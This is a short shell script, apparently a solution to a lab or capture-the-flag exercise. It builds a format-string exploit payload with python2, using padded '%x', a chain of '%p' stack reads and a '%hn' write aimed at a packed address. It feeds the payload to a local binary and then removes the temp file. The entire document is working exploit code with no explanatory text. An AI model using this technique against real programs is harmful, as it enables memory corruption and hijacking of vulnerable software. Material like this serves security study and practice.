#!/usr/bin/env sh

python2 -c "print '%004304x %p %p %p %p %p %p %p %p %p %hn ' + '\x30\x40\x40\x00\x00\x00\x00\x00'" > temp
./a.out < temp 
rm temp
